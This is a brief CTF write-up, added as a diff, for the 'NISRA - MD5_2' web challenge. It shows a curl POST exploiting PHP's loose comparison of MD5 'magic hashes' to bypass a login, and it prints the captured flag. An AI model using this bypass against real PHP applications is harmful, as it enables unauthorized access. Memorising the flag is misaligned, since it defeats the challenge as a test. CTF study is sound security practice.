@@ -1,0 +1,12 @@
+---
+title: NISRA - MD5_2
+tags: [NISRA, CTF, Web]
+
+---
+
+# NISRA - MD5_2
+## Exploit
+Payload: `curl http://chall2.nisra.net:41023/ -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "user=240610708&password=QNKCDZO"`
+Flag: `NISRA{S3CuR17y_1ssuEs_Of_pHP_@ND_Md5}`
+## Reference
+[md5('240610708') == md5('QNKCDZO')](https://news.ycombinator.com/item?id=9484757)
